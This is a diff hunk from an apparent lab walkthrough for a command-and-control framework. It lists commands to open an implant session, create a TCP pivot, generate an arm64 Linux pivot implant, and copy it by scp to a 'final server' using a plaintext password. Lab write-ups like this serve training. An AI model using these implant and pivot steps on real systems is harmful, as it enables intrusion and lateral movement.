@@ -11,5 +11,5 @@ View sessions: `sessions`\
 Use the Implant: `use [session number]`\
 Create a pivot through that implant: `pivots tcp --lport [Pivot Port]`\
 Generate an implant for that pivot: `generate --os linux --arch arm64 --tcp-pivot [IP Address of Intermediate Server:[Pivot Port] --name [Pivot Implant Name]`\
-Upload that implant to his desktop with the upload command:
+Upload that implant to his desktop with the upload command: 
 Use our implant to scp it over to the Final Server: `scp [Pivot Implant Name] aeverwooddesktop@[IP of Final Server]:/home/aeverwooddesktop/Documents` (Password is 'temple435')`\
